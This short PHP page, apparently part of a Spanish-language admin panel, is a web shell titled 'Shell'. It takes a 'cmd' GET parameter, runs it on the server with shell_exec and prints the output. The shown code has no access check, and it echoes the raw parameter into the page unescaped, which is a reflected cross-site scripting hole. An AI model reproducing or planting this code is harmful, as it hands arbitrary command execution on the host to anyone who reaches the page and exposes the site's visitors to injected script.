<?php

include_once "base.php";

baseSuperior("Shell");
?>

        <div id="usuarios">
            <form action="shell.php" method="get">
                <div><input id="inputcillo" type="text" value="" name="cmd" style="width: 500px;"/></div>
            </form>
        </div>
        
        <script type="text/javascript">
          document.getElementById('inputcillo').focus();
        </script>
        
<?php

$cmd = getGet("cmd");
if ($cmd == "")
    $cmd = "pwd";
echo "<br />".getGet("cmd")."<br /><br />";
print nl2br(shell_exec("$cmd 2>&1"));


baseInferior();
?>
